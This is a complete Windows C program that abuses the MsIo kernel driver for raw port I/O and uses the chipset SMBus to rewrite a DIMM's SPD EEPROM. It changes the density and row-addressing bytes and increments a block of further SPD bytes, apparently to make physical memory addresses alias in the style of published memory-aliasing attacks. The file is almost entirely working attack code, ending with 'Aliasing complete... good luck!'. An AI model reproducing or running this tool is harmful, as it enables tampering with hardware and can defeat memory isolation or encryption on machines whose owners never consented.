#include <windows.h>
#include <stdio.h>

#define IOCTL_READ_PORT  0x80102050 // grabbed IOCTL codes from msio driver reversed in IDA pro
#define IOCTL_WRITE_PORT 0x80102054

#define SMBBASE     0x0B00 // tested on asus ROG STRIX B450-F Gaming mobo - milage may vary
#define SMBHSTSTS   (SMBBASE + 0x00)
#define SMBHSTCNT   (SMBBASE + 0x02)
#define SMBHSTCMD   (SMBBASE + 0x03)
#define SMBHSTADD   (SMBBASE + 0x04)
#define SMBHSTDAT0  (SMBBASE + 0x05)

typedef struct {
    USHORT Port;
    BYTE   Value;
    BYTE   useless;
    USHORT useless2;
    BYTE   DataSize_maybe;
} IO_STRUCTURE;

BOOL WritePort(HANDLE hDriver, USHORT port, BYTE value) {
    IO_STRUCTURE inputBuffer = { port, value, 0, 0, 1 };
    DWORD returned;
    return DeviceIoControl(hDriver, IOCTL_WRITE_PORT,
        &inputBuffer, sizeof(inputBuffer),
        NULL, 0,
        &returned, NULL);
}

BOOL ReadPort(HANDLE hDriver, USHORT port, BYTE* result) {
    IO_STRUCTURE inputBuffer = { port, 0x35, 0x01, 0, 1 };
    DWORD outBuffer = 0;
    DWORD returned;
    BOOL ok = DeviceIoControl(hDriver, IOCTL_READ_PORT,
        &inputBuffer, sizeof(inputBuffer),
        &outBuffer, sizeof(outBuffer),
        &returned, NULL);
    if (ok) *result = (BYTE)(outBuffer & 0xFF); // clips the 4 byte output buffer
    return ok;
}

BOOL WaitSMBusComplete(HANDLE hDriver) {
    BYTE status;
    int timeout = 100;
    while (timeout--) {
        if (!ReadPort(hDriver, SMBHSTSTS, &status))
            return FALSE;

        // errors :( 
        if (status & 0x04) { printf("  [-] SMBus DEV_ERR\n");  return FALSE; }
        if (status & 0x08) { printf("  [-] SMBus BUS_ERR\n");  return FALSE; }
        if (status & 0x10) { printf("  [-] SMBus FAILED\n");   return FALSE; }

        if (status & 0x02) // transaction complete
            return TRUE;

        WritePort(hDriver, SMBHSTSTS, 0x02);
        Sleep(1);
    }

    printf("  [-] SMBus timed out, last status = 0x%02X\n", status);
    return FALSE;
}

BOOL SwapPage(HANDLE hDriver, BOOL page1) {
    BYTE addr = page1 ? 0x6E : 0x6C;

    WritePort(hDriver, SMBHSTSTS, 0x1E);   // clear status
    WritePort(hDriver, SMBHSTADD, addr);   // set page device address
    WritePort(hDriver, SMBHSTCNT, 0x44);   // send byte command — no data needed

    if (!WaitSMBusComplete(hDriver)) {
        printf("  [!] Page swap failed\n");
        return FALSE;
    }

    printf("  [+] Switched to page %d\n", page1 ? 1 : 0);
    return TRUE;
}

BOOL ReadSPDByte(HANDLE hDriver, BYTE slot, BYTE offset, BYTE* result) {
    BYTE addr = ((0x50 | slot) << 1) | 0x01;  // last bit is read/write 

    // 0B03 for setting byte to write to 
    WritePort(hDriver, SMBHSTCMD, offset);
    // status set
    WritePort(hDriver, SMBHSTSTS, 0x1E);
    // DIMM slot/write direction set
    WritePort(hDriver, SMBHSTADD, addr);
    // fire transaction
    WritePort(hDriver, SMBHSTCNT, 0x48);

    // wait for 0x02 from status 
    if (!WaitSMBusComplete(hDriver))
        return FALSE;

    // read result 
    if (!ReadPort(hDriver, SMBHSTDAT0, result))
        return FALSE;

    return TRUE;
}

BOOL WriteSPDByte(HANDLE hDriver, BYTE slot, BYTE offset, BYTE data) {
    BYTE addr = ((0x50 | slot) << 1) | 0x00;  // write bit clear

    WritePort(hDriver, SMBHSTCMD, offset);
    WritePort(hDriver, SMBHSTSTS, 0x1E);
    // write to data port (0B05) other sets are as above 
    WritePort(hDriver, SMBHSTDAT0, data);
    WritePort(hDriver, SMBHSTADD, addr);
    WritePort(hDriver, SMBHSTCNT, 0x48);

    if (!WaitSMBusComplete(hDriver))
        return FALSE;

    return TRUE;
}


void aliasDIMM(HANDLE hDriver, BYTE slot, BOOL sign) {
    BYTE densityByte = 0x00;
    BYTE addressingByte = 0x00;

    printf("  [+] Reading addressing informaiton from DIMM\n");

    if (!ReadSPDByte(hDriver, slot, 0x04, &densityByte)) {
        printf("  [+] Read failed\n");
        return;
    }
    if (!ReadSPDByte(hDriver, slot, 0x05, &addressingByte)) {
        printf("  [+] Read failed\n");
        return;
    }

    printf("  [+] SPD byte: 0x04 = 0x%02X, 0x05 = 0x%02X\n\n", densityByte, addressingByte);

    const char* density = "Unknown";
    switch (densityByte & 0x0F) { // bits 3-0 are density 
    case 0x03: density = "2 Gb";  break;
    case 0x04: density = "4 Gb";  break;
    case 0x05: density = "8 Gb";  break;
    case 0x06: density = "16 Gb"; break;
    case 0x07: density = "32 Gb"; break;
    }

    int row_bits = 0;
    switch ((addressingByte >> 3) & 0x07) { //  bits 5-3 are row address bits
    case 0x00: row_bits = 12; break;
    case 0x01: row_bits = 13; break;
    case 0x02: row_bits = 14; break;
    case 0x03: row_bits = 15; break;
    case 0x04: row_bits = 16; break;
    case 0x05: row_bits = 17; break;
    case 0x06: row_bits = 18; break;
    }

    int col_bits = 0; //  bits 2-0 are column address bits
    switch (addressingByte & 0x07) {
    case 0x00: col_bits = 9; break;
    case 0x01: col_bits = 10; break;
    case 0x02: col_bits = 11; break;
    case 0x03: col_bits = 12; break;
    }

    printf("      [+] Density    : %s\n", density);
    printf("      [+] Row addressing bits    : %d\n", row_bits);
    printf("      [+] Column addressing bits    : %d\n", col_bits);
    printf("\n");

    BYTE newDensityByte = 0x00;
    BYTE newAddressingByte = 0x00;

    if (sign)
    {
        newDensityByte = ((densityByte & 0x0F) + 0x01) + (densityByte & 0xF0);
        newAddressingByte = ((((addressingByte >> 3) & 0x07) + 0x01) << 3) + (addressingByte & 0xC7);
    }
    else
    {
        newDensityByte = ((densityByte & 0x0F) - 0x01) + (densityByte & 0xF0);
        newAddressingByte = ((((addressingByte >> 3) & 0x07) - 0x01) << 3) + (addressingByte & 0xC7);
    }

    printf("  [+] New byte 0x04 = 0x%02X, 0x05 = 0x%02X\n", newDensityByte, newAddressingByte);

    switch (newDensityByte & 0x0F) { // bits 3-0 are density 
    case 0x03: density = "2 Gb";  break;
    case 0x04: density = "4 Gb";  break;
    case 0x05: density = "8 Gb";  break;
    case 0x06: density = "16 Gb"; break;
    case 0x07: density = "32 Gb"; break;
    }

    switch ((newAddressingByte >> 3) & 0x07) { //  bits 5-3 are row address bits
    case 0x00: row_bits = 12; break;
    case 0x01: row_bits = 13; break;
    case 0x02: row_bits = 14; break;
    case 0x03: row_bits = 15; break;
    case 0x04: row_bits = 16; break;
    case 0x05: row_bits = 17; break;
    case 0x06: row_bits = 18; break;
    }

    switch (newAddressingByte & 0x07) {
    case 0x00: col_bits = 9; break;
    case 0x01: col_bits = 10; break;
    case 0x02: col_bits = 11; break;
    case 0x03: col_bits = 12; break;
    }

    printf("      [+] New Density    : %s\n", density);
    printf("      [+] New Row addressing bits    : %d\n", row_bits);
    printf("\n");

    printf("  [+] Writing 0x%02X to 0x04...\n", newDensityByte);
    if (!WriteSPDByte(hDriver, slot, 0x04, newDensityByte)) {
        printf("  [-] Write to 0x04 failed — may be write protected\n");
        return;
    }

    printf("  [+] Writing 0x%02X to 0x05...\n", newAddressingByte);
    if (!WriteSPDByte(hDriver, slot, 0x05, newAddressingByte)) {
        printf("  [-] Write to 0x05 failed — may be write protected\n");
        return;
    }

    SwapPage(hDriver, TRUE);

    for (BYTE offset = 0x40; offset <= 0x5C; offset++) {
        BYTE original = 0;
        BYTE readback = 0;

        // Read original
        if (!ReadSPDByte(hDriver, slot, offset, &original)) {
            printf("  [-] Failed to read byte 0x1%02X\n", offset);
            continue;
        }

        BYTE newVal = original + 0x01;

        // Write incremented value
        if (!WriteSPDByte(hDriver, slot, offset, newVal)) {
            printf("  [-] Failed to write byte 0x1%02X — may be write protected\n", offset);
            continue;
        }

        // Verify
        Sleep(10);
        if (!ReadSPDByte(hDriver, slot, offset, &readback)) {
            printf("  [-] Failed to read back byte 0x1%02X\n", offset);
            continue;
        }

        if (readback == newVal) {
            printf("  [+] Byte 0x1%02X: 0x%02X -> 0x%02X OK\n", offset, original, readback);
        }
        else {
            printf("  [!] Byte 0x1%02X: wrote 0x%02X but read back 0x%02X\n", offset, newVal, readback);
        }
    }

    SwapPage(hDriver, FALSE);


    if (sign) printf("  === Aliasing complete... good luck! ===\n\n");
    else printf("  === Un-aliasing complete... good luck! ===\n\n");
}


int main() {
    // Open driver
    HANDLE hDriver = CreateFileW(L"\\\\.\\MsIo",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL, NULL);

    if (hDriver == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open MsIo driver %lu\n", GetLastError());
        return 1;
    }
    printf("[+] MsIo driver opened successfully\n\n");

    int slot = 2;

    printf("\n  [+] Selected slot: %d (I2C address 0x%02X)\n\n",
        slot, (0x50 | slot) << 1);

    aliasDIMM(hDriver, (BYTE)slot, 1);

    CloseHandle(hDriver);
    printf("  [+] Done.\n");
    return 0;
}